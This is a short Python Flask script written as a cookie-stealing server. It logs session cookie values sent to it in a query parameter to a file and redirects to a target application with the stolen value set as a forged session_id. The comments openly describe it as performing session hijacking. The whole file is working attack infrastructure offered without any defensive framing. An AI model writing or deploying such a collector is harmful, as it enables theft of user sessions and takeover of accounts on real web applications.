from flask import Flask, request, redirect, make_response
from datetime import datetime

app = Flask(__name__)

@app.route('/')
def cookie():
    cookie_value = request.args.get('c')

    # Log the cookie value and current timestamp
    with open('cookies.txt', 'a') as f:
        f.write(f"{cookie_value} - {str(datetime.now())}\n")

    # Perform session hijacking by creating a forged response with the stolen cookie
    response = make_response(redirect('http://vulnerable-application'))
    response.set_cookie('session_id', cookie_value)  # Set a forged session ID
    return response

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=1337)
